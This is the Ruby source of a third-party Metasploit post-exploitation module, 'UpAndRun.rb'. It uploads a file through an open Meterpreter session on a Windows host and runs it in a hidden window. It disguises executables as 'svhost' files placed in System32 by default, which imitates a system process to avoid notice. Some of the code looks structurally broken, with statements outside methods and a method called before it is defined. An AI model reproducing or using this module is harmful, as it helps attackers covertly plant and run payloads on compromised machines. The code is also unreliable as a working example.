##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
#
# [ UpAndRun.rb - upload a script or executable and run it ]
# $Id$ V1.0 Author: pedr0 Ubuntu [r00t-3xp10it]
# Hosted By: peterubuntu10[at]sourceforge[dot]net
# http://sourceforge.net/p/myauxiliarymete/wiki/Home/
# ---------------------------------------------
# Based on: [darkoperator & sinn3r] metasploit modules!
# http://www.offensive-security.com/metasploit-unleashed/Building_A_Module
# http://www.offensive-security.com/metasploit-unleashed/Useful_API_Calls
# http://www.rubydoc.info/github/rapid7/metasploit-framework/index
# (the only CORE/API documentation available to study) :(
#
##



  class MetasploitModule < Msf::Post
        Rank = NormalRanking



# ------------------------------------
# Building Metasploit/Armitage info/GUI
# ------------------------------------
	def initialize(info={})
		super(update_info(info,
			'Name'          => '[ UpAndRun.rb - upload a script or executable and run it ]',
			'Description'   => %q{
					this module needs will upload a payload onto target system,
                                        using an existence meterpreter open session (post-exploitation)
                                        and then run it in a hidden chanalized windows.

			},
			'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
				[
					'peterubuntu10[at]sourceforge[dot]net',
				],

			'Version'       => '$Revision: 1.1',
                        'releasedDate'  => 'ago 4 2016',
			'Platform'      => 'windows',
			'Arch'          => 'x86_x64',
			'References'    =>
				[
					[ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
					[ 'URL', 'http://sourceforge.net/projects/myauxiliarymete/?source=navbar' ],
					[ 'URL', 'http://www.offensive-security.com/metasploit-unleashed/Building_A_Module' ],
					[ 'URL', 'http://oldmanlab.blogspot.pt/p/meterpreter-api-cheat-sheet.html' ],
					[ 'URL', 'http://www.rubydoc.info/github/rapid7/metasploit-framework/index' ],
					[ 'URL', 'https://github.com/rapid7/metasploit-framework/tree/master/modules/post' ],
					[ 'URL', 'https://www.facebook.com/Backtrack.Kali' ],
					[ 'URL', 'http://www.r00tsect0r.net' ]
				],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
			'SessionTypes'  => [ 'shell', 'meterpreter' ]

		))

		register_options(
			[
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('upload', [ false, 'Executable or script to upload to target host.']),
                                OptString.new('path', [ false, 'Path on target to upload executable, default is %SYSTEM32%.'])
			], self.class)

	end




# -------------------------------------------
# variable declaration - metasploit API calls
# -------------------------------------------
session = client
trgloc = datastore['path']
file = datastore['upload']
sysnfo = session.sys.config.sysinfo





unsupported if client.platform !~ /win32|win64/i
# -------------------------------------
# check for proper Meterpreter Platform
# -------------------------------------
def unsupported
   sys = session.sys.config.sysinfo
   print_error("Operative System: #{sys['OS']}")
   print_error("This auxiliary only works against windows systems!")
   print_error("Please execute [info] for further information...")
   raise Rex::Script::Completed
   print_line("")
end




# ----------------------------------------------------------
# upload file to target (system32 OR other location inputed)
# and execute it on a hidden channelized windows
# ----------------------------------------------------------
def upload(session,file,trgloc)
	if not ::File.exists?(file)
		raise "#{file} to Upload does not exists!"
	else
		if trgloc == ""
		location = session.fs.file.expand_path("%SYSTEM32%")
		else
			location = trgloc

		end
		begin
			ext = file[file.rindex(".") .. -1]
			if ext and ext.downcase == ".exe"
				fileontrgt = "#{location}\\svhost#{rand(100)}.exe"
			else
				fileontrgt = "#{location}\\TMP#{rand(100)}#{ext}"
			end
                        print_line("")
			print_status("Uploading => #{file}...")
			session.fs.file.upload_file("#{fileontrgt}","#{file}")
			print_status("#{file} uploaded! to => #{fileontrgt}")

                           r=''
                           r = session.sys.process.execute("cmd.exe /c start #{fileontrgt}", nil, {'Hidden' => true, 'Channelized' => true})
                           print_good("Execute => #{file}")
                           print_status("agent uploaded and executed successfully!")
                           print_line("")

                     # close channel when done
                     r.channel.close
                     r.close
		rescue ::Exception => e
			print_status("Error uploading file #{file}: #{e.class} #{e}")
                        print_line("")
			raise e
		end
	end
	return fileontrgt
end
